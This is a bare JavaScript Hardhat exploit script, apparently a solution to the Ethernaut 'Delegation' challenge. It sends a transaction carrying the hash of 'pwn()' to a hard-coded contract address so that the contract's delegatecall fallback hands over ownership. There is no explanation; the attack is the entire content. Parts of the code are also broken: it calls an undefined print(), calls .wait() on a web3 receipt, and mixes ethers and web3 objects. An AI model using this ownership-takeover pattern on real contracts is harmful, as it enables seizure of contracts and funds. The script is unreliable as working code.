

async function main() {
  // We get the contract to deploy
  const Delegation = await hre.ethers.getContractFactory("Delegation");
  const delegation = await Delegation.attach("0x0d79Ce3016817c61C8c7Ada9a2865A08FA555A19");
  console.log("Data: ", web3.utils.sha3("pwn()"));
  console.log("Delegation attached to:", delegation.address);
  const pwn = await web3.eth.sendTransaction({from: "0x8FEebfA4aC7AF314d90a0c17C3F91C800cFdE44B",
  to: "0x0d79Ce3016817c61C8c7Ada9a2865A08FA555A19",
   data: web3.utils.sha3("pwn()") });
  
  await pwn.wait();
  print(delegation.owner);

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
